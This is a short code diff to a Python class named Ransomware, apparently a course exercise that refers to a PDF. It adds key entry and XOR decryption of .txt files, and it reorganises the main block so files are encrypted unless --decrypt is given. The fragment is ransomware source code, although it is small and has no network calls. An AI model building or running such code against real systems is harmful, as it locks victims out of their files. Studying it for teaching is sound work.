@@ -70,8 +70,10 @@ class Ransomware:
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        self._log.info("PASSING THROUGH decrypt() FUNCTION!!!!")
-
+        self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
+        self._secret_manager.load()
+        candidate_key = input("Please enter your cryptographic key:")
+        self._secret_manager.set_key(candidate_key)
         self._secret_manager.xorfiles(self.get_files("*.txt"))
 
 if __name__ == "__main__":
@@ -81,11 +83,9 @@ if __name__ == "__main__":
         logging.basicConfig(level=logging.DEBUG)
     else:
         logging.basicConfig(level=logging.INFO)
-    
+
+    ransomware = Ransomware()
     if not "--decrypt" in sys.argv:
-        ransomware = Ransomware()
         ransomware.encrypt()
-    elif "--decrypt" in sys.argv:
-        ransomware = Ransomware()
-        ransomware.encrypt()
+    if "--decrypt" in sys.argv:
         ransomware.decrypt()
